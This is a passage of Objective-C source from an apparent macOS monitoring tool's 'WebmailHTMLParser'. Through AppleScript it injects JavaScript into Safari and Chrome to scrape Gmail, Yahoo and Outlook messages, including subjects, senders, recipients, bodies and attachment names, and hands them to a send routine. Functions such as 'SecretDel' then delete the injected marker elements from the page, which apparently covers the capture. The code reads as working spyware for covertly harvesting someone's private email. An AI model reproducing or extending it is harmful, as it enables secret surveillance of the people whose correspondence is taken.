                        NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"delay 1 \n tell application \"Safari\" \n do JavaScript \" function deleter(){ var node = document.getElementsByClassName('yh_cap_s'); for(var i = 0; i < node.length; i++) { node[i].parentNode.removeChild(node[i]); } } deleter(); \" \n return the result \n end tell"];
                        [scpt executeAndReturnError:nil];
                        [scpt release];
                    }else if([aType isEqualToString:@"Google Chrome"]){
                        NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"delay 1 \n tell application \"Google Chrome\" \n execute front window's active tab javascript \" function deleter(){ var node = document.getElementsByClassName('yh_cap_s'); for(var i = 0; i < node.length; i++) { node[i].parentNode.removeChild(node[i]); } } deleter(); \" \n return the result \n end tell"];
                        [scpt executeAndReturnError:nil];
                        [scpt release];
                    }
                }
            }
        }
    }
    DLog(@"End OUT Yahoo_HTMLParser");
    [receiver release];
    [receiverEmail release];
    [attachment release];
}

+(void) Gmail_HTMLParser:(NSString *)aMyhtml{
    DLog(@"IN Gmail_HTMLParser");
    NSString * subject =@"";
    NSString * sender =@"";
    NSString * senderEmail =@"";
    NSString * senderImageUrl =@"";
    NSMutableArray * receiver=[[NSMutableArray alloc]init];
    NSMutableArray * receiverEmail=[[NSMutableArray alloc]init];
    NSMutableArray * attachment=[[NSMutableArray alloc]init];
    NSString * receiverImageUrl =@"";
    NSString * sentDate =@"";
    NSString * messageBody =@"";
    
    NSString * clearHTML = [aMyhtml stringByReplacingOccurrencesOfString:@"&nbsp;" withString:@""];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&lt;" withString:@"<"];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&gt;" withString:@">"];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&quot;" withString:@"\""];
    
    if ([clearHTML rangeOfString:@"class=\"nH if\""].location != NSNotFound) {
        NSArray * origin = [clearHTML componentsSeparatedByString:@"class=\"nH if\""];
        
        for (int i=0; i <[origin count]; i++) {
            if ([[origin objectAtIndex:i] rangeOfString:@"class=\"nH\""].location != NSNotFound) {
                NSArray * temp_1 =  [[origin objectAtIndex:i] componentsSeparatedByString:@"class=\"nH\""];
                for (int k=0; k <[temp_1 count]; k++) {
                    if ([[temp_1 objectAtIndex:k] rangeOfString:@"class=\"ha\""].location != NSNotFound) {
                        NSArray * temp_2 =  [[temp_1 objectAtIndex:k] componentsSeparatedByString:@"class=\"ha\""];
                        for (int j=0; j<[temp_2 count]; j++) {
                            if ([[temp_2 objectAtIndex:j] rangeOfString:@"class=\"hP\""].location != NSNotFound) {
                                NSArray * temp_3 =  [[temp_2 objectAtIndex:j] componentsSeparatedByString:@"class=\"hP\""];
                                temp_3 = [[temp_3 objectAtIndex:j] componentsSeparatedByString:@"\">"];
                                temp_3 = [[temp_3 objectAtIndex:1] componentsSeparatedByString:@"</h2>"];
                                subject = [temp_3 objectAtIndex:0];
                                break;
                            }
                        }
                    }
                }
            }
        }
    }
    
    if ([clearHTML rangeOfString:@"content:url(//lh"].location != NSNotFound) {
        NSArray * origin = [clearHTML componentsSeparatedByString:@"content:url(//lh"];
        for (int i=1; i <[origin count]; i++) {
            if ([[origin objectAtIndex:i] rangeOfString:@"photo.jpg"].location != NSNotFound) {
                NSArray * temp_1 =  [[origin objectAtIndex:i] componentsSeparatedByString:@"photo.jpg"];
                for (int k = 0; k < [temp_1 count]; k++) {
                    if ([[temp_1 objectAtIndex:k]length]>0) {
                        receiverImageUrl = [NSString stringWithFormat:@"https://lh%@photo.jpg",[temp_1 objectAtIndex:k]];
                        break;
                    }
                }
                if ([receiverImageUrl length]>0) {
                    break;
                }
            }
        }
    }
    
    if ([clearHTML rangeOfString:@"class=\"aFg\""].location != NSNotFound) {
        NSArray * origin = [clearHTML componentsSeparatedByString:@"class=\"aFg\""];
        for (int i=1; i <[origin count]; i++) {
            if ([[origin objectAtIndex:i] rangeOfString:@"src=\""].location != NSNotFound) {
                NSArray * temp_1 =  [[origin objectAtIndex:i] componentsSeparatedByString:@"src=\""];
                temp_1 = [[temp_1 objectAtIndex:1] componentsSeparatedByString:@"\""];
                senderImageUrl = [temp_1 objectAtIndex:0];
                if ([senderImageUrl rangeOfString:@"ssl.gstatic.com"].location != NSNotFound) {
                    senderImageUrl = @"";
                }
                break;
            }
        }
    }
    
    if ([clearHTML rangeOfString:@"class=\"iw\""].location != NSNotFound) {
        NSArray * origin = [clearHTML componentsSeparatedByString:@"class=\"iw\""];
        for (int i=1; i <[origin count]; i++) {
            if ([[origin objectAtIndex:i] rangeOfString:@"</span>"].location != NSNotFound) {
                NSArray * temp_1 =  [[origin objectAtIndex:i] componentsSeparatedByString:@"</span>"];
                NSString * origin_tag = [temp_1 objectAtIndex:0];
                NSArray * temp_sub_1 = [origin_tag componentsSeparatedByString:@"email=\""];
                temp_sub_1 = [[temp_sub_1 objectAtIndex:1] componentsSeparatedByString:@"\""];
                senderEmail = [temp_sub_1 objectAtIndex:0];
                NSArray * temp_sub_2 = [origin_tag componentsSeparatedByString:@"name=\""];
                temp_sub_2 = [[temp_sub_2 objectAtIndex:1] componentsSeparatedByString:@"\""];
                sender = [temp_sub_2 objectAtIndex:0];
                break;
            }
        }
    }
    
    if ([clearHTML rangeOfString:@"class=\"g3\""].location != NSNotFound) {
        NSArray * origin = [clearHTML componentsSeparatedByString:@"class=\"g3\""];
        for (int i=1; i <[origin count]; i++) {
            if ([[origin objectAtIndex:i] rangeOfString:@"</span>"].location != NSNotFound) {
                NSArray * temp_1 =  [[origin objectAtIndex:i] componentsSeparatedByString:@"</span>"];
                NSString * origin_tag = [temp_1 objectAtIndex:0];
                NSArray * temp_sub_1 = [origin_tag componentsSeparatedByString:@"title=\""];
                temp_sub_1 = [[temp_sub_1 objectAtIndex:1] componentsSeparatedByString:@"\""];
                sentDate = [temp_sub_1 objectAtIndex:0];
                break;
            }
        }
    }
    
    if ([clearHTML rangeOfString:@"class=\"hb\""].location != NSNotFound) {
        NSArray * origin = [clearHTML componentsSeparatedByString:@"class=\"hb\""];
        
        for (int i=1; i <[origin count]; i++) {
            if ([[origin objectAtIndex:i] rangeOfString:@"</span></div>"].location != NSNotFound) {
                NSArray * temp_1 =  [[origin objectAtIndex:i] componentsSeparatedByString:@"</span></div>"];
                NSString * origin_tag = [temp_1 objectAtIndex:0];
                
                NSArray * temp_sub_1 = [origin_tag componentsSeparatedByString:@","];
                for (int j=0;j<[temp_sub_1 count]; j++) {
                    if ([[temp_sub_1 objectAtIndex:j] rangeOfString:@"email=\""].location != NSNotFound) {
                        NSArray *local_temp = [[temp_sub_1 objectAtIndex:j] componentsSeparatedByString:@"email=\""];
                        local_temp = [[local_temp objectAtIndex:1] componentsSeparatedByString:@"\""];
                        [receiverEmail addObject:[local_temp objectAtIndex:0]];
                    }
                    if ([[temp_sub_1 objectAtIndex:j] rangeOfString:@"name=\""].location != NSNotFound) {
                        NSArray *local_temp = [[temp_sub_1 objectAtIndex:j] componentsSeparatedByString:@"name=\""];
                        local_temp = [[local_temp objectAtIndex:1] componentsSeparatedByString:@"\""];
                        [receiver addObject:[local_temp objectAtIndex:0]];
                    }
                }
                break;
            }
        }
    }
    
    if ([clearHTML rangeOfString:@"class=\"a3s"].location != NSNotFound) {
        NSArray * origin = [clearHTML componentsSeparatedByString:@"class=\"a3s"];
        messageBody = [NSString stringWithFormat:@"<div> %@ </div>",[origin objectAtIndex:1]];
        //[messageBody writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/web_mail.html", NSUserName()] atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
    
    if ([clearHTML rangeOfString:@"class=\"hq gt"].location != NSNotFound) {
        NSArray * origin = [clearHTML componentsSeparatedByString:@"class=\"hq gt"];
        origin = [[origin objectAtIndex:1] componentsSeparatedByString:@"<div class=\"hi\">"];
        if ([[origin objectAtIndex:0] rangeOfString:@"class=\"aQw\""].location != NSNotFound) {
            NSArray * eachFile = [[origin objectAtIndex:0] componentsSeparatedByString:@"class=\"aQw\""];
            for (int i = 1; i< [eachFile count]; i++) {
                if ([[eachFile objectAtIndex:i] rangeOfString:@"aria-label=\""].location != NSNotFound) {
                    NSArray * ath = [[eachFile objectAtIndex:i] componentsSeparatedByString:@"aria-label=\""];
                    ath = [[ath objectAtIndex:1] componentsSeparatedByString:@"\""];
                    [attachment addObject:[ath objectAtIndex:0]];
                }
            }
        }
    }
    
    [WebmailHTMLParser readyToSend_subject:subject sender:sender senderEmail:senderEmail senderImageUrl:senderImageUrl sentDate:sentDate receiver:receiver receiverEmail:receiverEmail receiverImageUrl:receiverImageUrl attachment:attachment messageBody:messageBody mailType:@"GMAIL" direction:kIncoming];
    
    DLog(@"End IN Gmail_HTMLParser");
    
    [attachment release];
    [receiver release];
    [receiverEmail release];
}

+(void) Gmail_HTMLParser_Outgoing:(NSString *)aMyhtml type:(NSString *)aType {
    DLog(@"OUT1 Gmail_HTMLParser");
    NSString * subject =@"";
    NSString * sender =@"";
    NSString * senderEmail =@"";
    NSString * senderImageUrl =@"";
    NSMutableArray * receiver=[[NSMutableArray alloc]init];
    NSMutableArray * receiverEmail=[[NSMutableArray alloc]init];
    NSMutableArray * attachment=[[NSMutableArray alloc]init];
    NSString * receiverImageUrl =@"";
    NSString * sentDate =@"";
    NSString * messageBody =@"";
    
    NSString * clearHTML = [aMyhtml stringByReplacingOccurrencesOfString:@"&nbsp;" withString:@""];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&lt;" withString:@"<"];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&gt;" withString:@">"];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&quot;" withString:@"\""];
    
    if ([clearHTML rangeOfString:@"class=\"gm_cap_s\""].location != NSNotFound) {
        NSArray * MasterTemp = [clearHTML componentsSeparatedByString:@"class=\"gm_cap_s\""];
        for(int m = 1 ; m <[MasterTemp count];m++){
            
            if ([[MasterTemp objectAtIndex:m] rangeOfString:@"class=\"nH Hd\" role=\"dialog\""].location != NSNotFound) {
                NSArray * temp = [[MasterTemp objectAtIndex:m] componentsSeparatedByString:@"class=\"nH Hd\" role=\"dialog\""];
                temp  = [[temp objectAtIndex:1] componentsSeparatedByString:@"class=\"aSs\""];
                NSString * origin = [temp objectAtIndex:0];
                
                if ([clearHTML rangeOfString:@"GM_SUBJ_S:"].location != NSNotFound) {
                    NSArray * sub_origin = [clearHTML componentsSeparatedByString:@"GM_SUBJ_S:"];
                    sub_origin = [[sub_origin objectAtIndex:1] componentsSeparatedByString:@"\">"];
                    subject = [sub_origin objectAtIndex:0];
                }
                
                if ([clearHTML rangeOfString:@"content:url(//lh"].location != NSNotFound) {
                    NSArray * sub_origin = [clearHTML componentsSeparatedByString:@"content:url(//lh"];
                    for (int i=1; i <[sub_origin count]; i++) {
                        if ([[sub_origin objectAtIndex:i] rangeOfString:@"photo.jpg"].location != NSNotFound) {
                            NSArray * temp_1 =  [[sub_origin objectAtIndex:i] componentsSeparatedByString:@"photo.jpg"];
                            for (int k = 0; k < [temp_1 count]; k++) {
                                if ([[temp_1 objectAtIndex:k]length]>0) {
                                    senderImageUrl = [NSString stringWithFormat:@"https://lh%@photo.jpg",[temp_1 objectAtIndex:k]];
                                    break;
                                }
                            }
                            if ([senderImageUrl length]>0) {
                                break;
                            }
                        }
                    }
                }
                
                if ([clearHTML rangeOfString:@"<title>"].location != NSNotFound) {
                    NSArray * temp = [clearHTML componentsSeparatedByString:@"<title>"];
                    temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"</title>"];
                    temp = [[temp objectAtIndex:0] componentsSeparatedByString:@" "];
                    for (int i=0; i<[temp count]; i++) {
                        if([[temp objectAtIndex:i] rangeOfString:@"@"].location != NSNotFound){
                            sender = @"";
                            senderEmail = [temp objectAtIndex:i];
                            break;
                        }
                    }
                }
                
                if ([origin rangeOfString:@"class=\"GS\""].location != NSNotFound) {
                    NSArray * originTemp = [origin componentsSeparatedByString:@"class=\"GS\""];
                    NSArray * localTemp = [originTemp copy];
                    
                    if ([[localTemp objectAtIndex:1] rangeOfString:@"<input name=\"subjectbox\""].location != NSNotFound) {
                        localTemp  = [[localTemp objectAtIndex:1] componentsSeparatedByString:@"<input name=\"subjectbox\""];
                        
                        if ([[localTemp objectAtIndex:0] rangeOfString:@"class=\"vR\""].location != NSNotFound) {
                            localTemp  = [[localTemp objectAtIndex:0] componentsSeparatedByString:@"class=\"vR\""];
                            for (int i=1; i< [localTemp count]; i++) {
                                NSArray * subTemp = [[localTemp objectAtIndex:i] componentsSeparatedByString:@"email=\""];
                                subTemp = [[subTemp objectAtIndex:1] componentsSeparatedByString:@"\">"];
                                if (![receiverEmail containsObject:[subTemp objectAtIndex:0]]) {
                                    [receiverEmail addObject:[subTemp objectAtIndex:0]];
                                }
                                
                                subTemp = [[localTemp objectAtIndex:i] componentsSeparatedByString:@"class=\"vT\">"];
                                subTemp = [[subTemp objectAtIndex:1] componentsSeparatedByString:@"</div>"];
                                if (![receiver containsObject:[subTemp objectAtIndex:0]]) {
                                    [receiver addObject:[subTemp objectAtIndex:0]];
                                }
                            }
                        }
                    }
                }
                
                if ([origin rangeOfString:@"class=\"cf An\""].location != NSNotFound) {
                    NSArray *temp  = [origin  componentsSeparatedByString:@"class=\"cf An\""];
                    temp  = [[temp objectAtIndex:1]  componentsSeparatedByString:@"</table></div>"];
                    messageBody = [messageBody stringByReplacingOccurrencesOfString:@"g_editable=\"true\"" withString:@""];
                    messageBody = [messageBody stringByReplacingOccurrencesOfString:@"role=\"textbox\"" withString:@""];
                    messageBody = [messageBody stringByReplacingOccurrencesOfString:@"contenteditable=\"true\"" withString:@""];
                    messageBody = [NSString stringWithFormat:@"<table %@",[temp objectAtIndex:0]];
                    //[messageBody writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/web_mail.html", NSUserName()] atomically:YES encoding:NSUTF8StringEncoding error:nil];
                }
                
                if ([origin rangeOfString:@"class=\"dL\""].location != NSNotFound) {
                    NSArray *temp = [origin  componentsSeparatedByString:@"class=\"dL\""];
                    for (int i=1; i<[temp count];i++) {
                        NSString * Local_AttachmentName = @"";
                        NSArray * subTemp = [[temp objectAtIndex:i] componentsSeparatedByString:@"class=\"vI\">"];
                        subTemp = [[subTemp objectAtIndex:1] componentsSeparatedByString:@"</div>"];
                        Local_AttachmentName = [NSString stringWithFormat:@"%@",[subTemp objectAtIndex:0]];
                        
                        subTemp = [[temp objectAtIndex:i] componentsSeparatedByString:@"class=\"vJ\">"];
                        subTemp = [[subTemp objectAtIndex:1] componentsSeparatedByString:@"</div>"];
                        Local_AttachmentName = [NSString stringWithFormat:@"%@%@",Local_AttachmentName,[subTemp objectAtIndex:0]];
                        [attachment addObject:Local_AttachmentName];
                    }
                }
                
                if ([subject length]>0){
                    NSDictionary *error = nil;
                    NSAppleEventDescriptor *result = nil;
                    NSAppleScript *scpt = nil;
                    if ([aType isEqualToString:@"Safari"]) {
                        scpt=[[NSAppleScript alloc] initWithSource:@"tell application \"Safari\" \n do JavaScript \"function getSenderName() { var node = document.getElementsByClassName('gb_ub')[0]; return node.innerHTML; } getSenderName(); \" in document 1 \n return the result \n end tell"];
                        result = [scpt executeAndReturnError:&error];
                        [scpt release];
                    }else if ([aType isEqualToString:@"Google Chrome"]) {
                        scpt =[[NSAppleScript alloc] initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function getSenderName() { var node = document.getElementsByClassName('gb_ub')[0]; return node.innerHTML; } getSenderName(); \" \n return the result \n end tell"];
                        result = [scpt executeAndReturnError:&error];
                        [scpt release];
                    }
                    
                    if (!error) {
                        sender = [result stringValue];
                    }
                    
                    sentDate = [WebmailHTMLParser roundUpSecond];
                    
                    [WebmailHTMLParser readyToSend_subject:subject sender:sender senderEmail:senderEmail senderImageUrl:senderImageUrl sentDate:sentDate receiver:receiver receiverEmail:receiverEmail receiverImageUrl:receiverImageUrl attachment:attachment messageBody:messageBody mailType:@"GMAIL" direction:kOutgoing];
                    
                    //sleep(1);
                    scpt = nil;
                    if ([aType isEqualToString:@"Safari"]) {
                        scpt=[[NSAppleScript alloc]initWithSource:@"delay 1 \n tell application \"Safari\" \n do JavaScript \"function SecretDel() { var node = document.getElementsByClassName('gm_cap_s'); var cloneNode = node; for(var j = 0; j < cloneNode.length; j++) { node[j].parentNode.removeChild(node[j]); } } SecretDel(); \" in document 1 \n return the result \n end tell"];
                        [scpt executeAndReturnError:nil];
                        [scpt release];
                    }else if ([aType isEqualToString:@"Google Chrome"]) {
                        scpt =[[NSAppleScript alloc]initWithSource:@"delay 1 \n tell application \"Google Chrome\" \n execute front window's active tab javascript \"function SecretDel() { var node = document.getElementsByClassName('gm_cap_s'); var cloneNode = node; for(var j = 0; j < cloneNode.length; j++) { node[j].parentNode.removeChild(node[j]); } } SecretDel(); \" \n return the result \n end tell"];
                        [scpt executeAndReturnError:nil];
                        [scpt release];
                    }
                    
                }else{
                    DLog(@"++ Not Sending");
                }
            }
        }
    }
    DLog(@"End OUT1 Gmail_HTMLParser");
    
    [attachment release];
    [receiver release];
    [receiverEmail release];
}

+(void) Gmail_HTMLParser_InMail_Outgoing:(NSString *)aMyhtml type:(NSString *)aType {
    DLog(@"OUT2 Gmail_HTMLParser");
    
    NSString * subject =@"";
    NSString * sender =@"";
    NSString * senderEmail =@"";
    NSString * senderImageUrl =@"";
    NSMutableArray * receiver=[[NSMutableArray alloc]init];
    NSMutableArray * receiverEmail=[[NSMutableArray alloc]init];
    NSMutableArray * attachment=[[NSMutableArray alloc]init];
    NSString * receiverImageUrl =@"";
    NSString * sentDate =@"";
    NSString * messageBody =@"";
    
    NSString * clearHTML = [aMyhtml stringByReplacingOccurrencesOfString:@"&nbsp;" withString:@""];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&lt;" withString:@"<"];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&gt;" withString:@">"];
    clearHTML = [clearHTML stringByReplacingOccurrencesOfString:@"&quot;" withString:@"\""];
    
    if ([clearHTML rangeOfString:@"class=\"gm_cap_s\""].location != NSNotFound) {
        NSArray * MasterTemp = [clearHTML componentsSeparatedByString:@"class=\"gm_cap_s\""];
        for(int m =1 ; m <[MasterTemp count];m++){
            
            if ([[MasterTemp objectAtIndex:m] rangeOfString:@"class=\"gA gt\""].location != NSNotFound) {
                NSArray * temp = [[MasterTemp objectAtIndex:m] componentsSeparatedByString:@"class=\"gA gt\""];
                temp  = [[temp objectAtIndex:1] componentsSeparatedByString:@"class=\"nH\""];
                NSString * origin = [temp objectAtIndex:0];
                
                if ([clearHTML rangeOfString:@"class=\"nH if\""].location != NSNotFound) {
                    NSArray * origin = [clearHTML componentsSeparatedByString:@"class=\"nH if\""];
                    
                    for (int i=0; i <[origin count]; i++) {
                        if ([[origin objectAtIndex:i] rangeOfString:@"class=\"nH\""].location != NSNotFound) {
                            NSArray * temp_1 =  [[origin objectAtIndex:i] componentsSeparatedByString:@"class=\"nH\""];
                            for (int k=0; k <[temp_1 count]; k++) {
                                if ([[temp_1 objectAtIndex:k] rangeOfString:@"class=\"ha\""].location != NSNotFound) {
                                    NSArray * temp_2 =  [[temp_1 objectAtIndex:k] componentsSeparatedByString:@"class=\"ha\""];
                                    for (int j=0; j<[temp_2 count]; j++) {
                                        if ([[temp_2 objectAtIndex:j] rangeOfString:@"class=\"hP\""].location != NSNotFound) {
                                            NSArray * temp_3 =  [[temp_2 objectAtIndex:j] componentsSeparatedByString:@"class=\"hP\""];
                                            temp_3 = [[temp_3 objectAtIndex:j] componentsSeparatedByString:@"\">"];
                                            temp_3 = [[temp_3 objectAtIndex:1] componentsSeparatedByString:@"</h2>"];
                                            subject = [temp_3 objectAtIndex:0];
                                            break;
                                        }
                                    }
                                    
                                }
                            }
                        }
                    }
                }
                
                if ([[MasterTemp objectAtIndex:m] rangeOfString:@"class=\"nH Hd\" role=\"dialog\""].location != NSNotFound) {
                    if ([aType isEqualToString:@"Safari"]) {
                        NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function myValue() {var  myVar = document.getElementsByClassName('aoT')[0].value; return myVar;} myValue();\" in document 1 \n return the result \n end tell"];
                        NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
                        subject = [scptResult stringValue];
                        [scpt release];
                    }else if ([aType isEqualToString:@"Google Chrome"]) {
                        NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function myValue() {var myVar = document.getElementsByClassName('aoT')[0].value; return myVar;} myValue();\" \n return the result \n end tell"];
                        NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
                        subject = [scptResult stringValue];
                        [scpt release];
                    }
                }
                
                if ([clearHTML rangeOfString:@"content:url(//lh"].location != NSNotFound) {
                    NSArray * origin = [clearHTML componentsSeparatedByString:@"content:url(//lh"];
                    for (int i=1; i <[origin count]; i++) {
                        if ([[origin objectAtIndex:i] rangeOfString:@"photo.jpg"].location != NSNotFound) {
                            NSArray * temp_1 =  [[origin objectAtIndex:i] componentsSeparatedByString:@"photo.jpg"];
                            for (int k = 0; k < [temp_1 count]; k++) {
                                if ([[temp_1 objectAtIndex:k]length]>0) {
                                    senderImageUrl = [NSString stringWithFormat:@"https://lh%@photo.jpg",[temp_1 objectAtIndex:k]];
                                    break;
                                }
                            }
                            if ([senderImageUrl length]>0) {
                                break;
                            }
                        }
                    }
                }
                
                if ([clearHTML rangeOfString:@"<title>"].location != NSNotFound) {
                    NSArray * temp = [clearHTML componentsSeparatedByString:@"<title>"];
                    temp = [[temp objectAtIndex:1] componentsSeparatedByString:@"</title>"];
                    temp = [[temp objectAtIndex:0] componentsSeparatedByString:@" "];
                    for (int i=0; i<[temp count]; i++) {
                        if([[temp objectAtIndex:i] rangeOfString:@"@"].location != NSNotFound){
                            sender = @"";
                            senderEmail = [temp objectAtIndex:i];
                            break;
                        }
                    }
                }
                
                if ([origin rangeOfString:@"class=\"GS\""].location != NSNotFound) {
                    NSArray * originTemp = [origin componentsSeparatedByString:@"class=\"GS\""];
                    originTemp = [[originTemp objectAtIndex:1] componentsSeparatedByString:@"class=\"eV\""];
                    originTemp = [[originTemp objectAtIndex:1] componentsSeparatedByString:@"class=\"vR\""];
                    
                    for (int i=1; i< [originTemp count]; i++) {
                        NSArray * subTemp = [[originTemp objectAtIndex:i] componentsSeparatedByString:@"email=\""];
                        subTemp = [[subTemp objectAtIndex:1] componentsSeparatedByString:@"\">"];
                        if (![receiverEmail containsObject:[subTemp objectAtIndex:0]]) {
                            [receiverEmail addObject:[subTemp objectAtIndex:0]];
                        }
                        
                        subTemp = [[originTemp objectAtIndex:i] componentsSeparatedByString:@"class=\"vT\">"];
                        subTemp = [[subTemp objectAtIndex:1] componentsSeparatedByString:@"</div>"];
                        if (![receiver containsObject:[subTemp objectAtIndex:0]]) {
                            [receiver addObject:[subTemp objectAtIndex:0]];
                        }
                    }
                }
                
                if ([origin rangeOfString:@"class=\"cf An\""].location != NSNotFound) {
                    NSArray *temp  = [origin  componentsSeparatedByString:@"class=\"cf An\""];
                    temp  = [[temp objectAtIndex:1]  componentsSeparatedByString:@"</tbody></table></div>"];
                    messageBody = [NSString stringWithFormat:@"<table %@ </table>",[temp objectAtIndex:0]];
                    messageBody = [messageBody stringByReplacingOccurrencesOfString:@"g_editable=\"true\"" withString:@""];
                    messageBody = [messageBody stringByReplacingOccurrencesOfString:@"role=\"textbox\"" withString:@""];
                    messageBody = [messageBody stringByReplacingOccurrencesOfString:@"contenteditable=\"true\"" withString:@""];
                    //[messageBody writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/web_mail.html", NSUserName()] atomically:YES encoding:NSUTF8StringEncoding error:nil];
                }
                
                if ([origin rangeOfString:@"class=\"dL\""].location != NSNotFound) {
                    NSArray *temp = [origin  componentsSeparatedByString:@"class=\"dL\""];
                    for (int i=1; i<[temp count];i++) {
                        NSString * Local_AttachmentName = @"";
                        NSArray * subTemp = [[temp objectAtIndex:i] componentsSeparatedByString:@"class=\"vI\">"];
                        subTemp = [[subTemp objectAtIndex:1] componentsSeparatedByString:@"</div>"];
                        Local_AttachmentName = [NSString stringWithFormat:@"%@",[subTemp objectAtIndex:0]];
                        
                        subTemp = [[temp objectAtIndex:i] componentsSeparatedByString:@"class=\"vJ\">"];
                        subTemp = [[subTemp objectAtIndex:1] componentsSeparatedByString:@"</div>"];
                        Local_AttachmentName = [NSString stringWithFormat:@"%@%@",Local_AttachmentName,[subTemp objectAtIndex:0]];
                        [attachment addObject:Local_AttachmentName];
                    }
                    
                }
                if ([subject length]>0){
                    NSDictionary *error = nil;
                    NSAppleEventDescriptor *result = nil;
                    NSAppleScript *scpt = nil;
                    if ([aType isEqualToString:@"Safari"]) {
                        scpt=[[NSAppleScript alloc] initWithSource:@"tell application \"Safari\" \n do JavaScript \"function getSenderName() { var node = document.getElementsByClassName('gb_ub')[0]; return node.innerHTML; } getSenderName(); \" in document 1 \n return the result \n end tell"];
                        result = [scpt executeAndReturnError:&error];
                        [scpt release];
                    }else if ([aType isEqualToString:@"Google Chrome"]) {
                        scpt =[[NSAppleScript alloc] initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function getSenderName() { var node = document.getElementsByClassName('gb_ub')[0]; return node.innerHTML; } getSenderName(); \" \n return the result \n end tell"];
                        result = [scpt executeAndReturnError:&error];
                        [scpt release];
                    }
                    
                    if (!error) {
                        sender = [result stringValue];
                    }
                    
                    sentDate = [WebmailHTMLParser roundUpSecond];
                    
                    [WebmailHTMLParser readyToSend_subject:subject sender:sender senderEmail:senderEmail senderImageUrl:senderImageUrl sentDate:sentDate receiver:receiver receiverEmail:receiverEmail receiverImageUrl:receiverImageUrl attachment:attachment messageBody:messageBody mailType:@"GMAIL" direction:kOutgoing];
                    
                    //sleep(1);
                    scpt = nil;
                    if ([aType isEqualToString:@"Safari"]) {
                        scpt=[[NSAppleScript alloc]initWithSource:@"delay 1 \n tell application \"Safari\" \n do JavaScript \"function SecretDel() { var node = document.getElementsByClassName('gm_cap_s'); var cloneNode = node; for(var j = 0; j < cloneNode.length; j++) { node[j].parentNode.removeChild(node[j]); } } SecretDel(); \" in document 1 \n return the result \n end tell"];
                        [scpt executeAndReturnError:nil];
                        [scpt release];
                        
                    }else if ([aType isEqualToString:@"Google Chrome"]) {
                        scpt =[[NSAppleScript alloc]initWithSource:@"delay 1 \n tell application \"Google Chrome\" \n execute front window's active tab javascript \"function SecretDel() { var node = document.getElementsByClassName('gm_cap_s'); var cloneNode = node; for(var j = 0; j < cloneNode.length; j++) { node[j].parentNode.removeChild(node[j]); } } SecretDel(); \" \n return the result \n end tell"];
                        [scpt executeAndReturnError:nil];
                        [scpt release];
                    }
                    
                }else{
                    DLog(@"++ Not Sending");
                }
                
            }
        }
    }
    DLog(@"End OUT2 Gmail_HTMLParser");
    
    [attachment release];
    [receiver release];
    [receiverEmail release];
}

+(void) Hotmail_HTMLParser_Outlook_Incoming:(NSString *)aType {
    
    DLog(@"IN Hotmail_HTMLParser_Outlook_Incoming");
    NSString * subject =@"";
    NSString * sender =@"";
    NSString * senderEmail =@"";
    NSString * senderImageUrl =@"";
    NSMutableArray * receiver=[[NSMutableArray alloc]init];
    NSMutableArray * receiverEmail=[[NSMutableArray alloc]init];
    NSMutableArray * attachment=[[NSMutableArray alloc]init];
    NSString * receiverImageUrl =@"";
    NSString * sentDate =@"";
    NSString * messageBody =@"";
 
    if (![[WebmailHTMLParser sharedWebmailHTMLParser] isUsingIncomingOutlook]) {
        
        [WebmailHTMLParser sharedWebmailHTMLParser].isUsingIncomingOutlook = true;
        
        if ([aType isEqualToString:@"Safari"]) {

            DLog(@"New Version Safari");

//            NSAppleScript *scpt1 = [[NSAppleScript alloc]initWithSource:@"delay 2.5\n tell application \"Safari\" \n do JavaScript \"function myValue() { var x = document.getElementsByClassName('_rp_H1'); for(var i=0;i < x.length; i++){ var c = x[i].getElementsByTagName('BUTTON'); if(c){ for(var j=0;j < c.length; j++){ var v = c[j].getAttribute('aria-checked'); if(v){ if(v.indexOf('false') != -1 ){ c[j].click(); } } } } } } myValue();\" in document 1 \n return the result \n end tell"];
//            [scpt1 executeAndReturnError:nil];
//            [scpt1 release];
//            sleep(0.75);
//            
//            NSAppleScript *scpt2 = [[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function myValue() {var myVar = document.getElementsByClassName('_rp_i')[0].textContent; return myVar;} myValue();\" in document 1 \n return the result \n end tell"];
//            NSAppleEventDescriptor * scptResult2 =[scpt2 executeAndReturnError:nil];
//            subject = [scptResult2 stringValue];
//            [scpt2 release];
//            
//            NSAppleScript *scpt3 = [[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function myValue() { return document.getElementsByClassName('ms-font-s _rp_z1 _rp_u1')[0].textContent;} myValue();\" in document 1 \n return the result \n end tell"];
//            NSAppleEventDescriptor * scptResult3 = [scpt3 executeAndReturnError:nil];
//            sentDate = [scptResult3 stringValue];
//            [scpt3 release];
//            
//            NSAppleScript *scpt4 = [[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function myValue() { return document.getElementsByClassName('ms-font-s _rp_z1 _rp_v1')[0].textContent;} myValue();\" in document 1 \n return the result \n end tell"];
//            NSAppleEventDescriptor * scptResult4 = [scpt4 executeAndReturnError:nil];
//            sender = [scptResult4 stringValue];
//            [scpt4 release];
//            NSArray * spliter = [sender componentsSeparatedByString:@" "];
//            NSString * tempName = @"";
//            for (int i=0; i < [spliter count]; i++) {
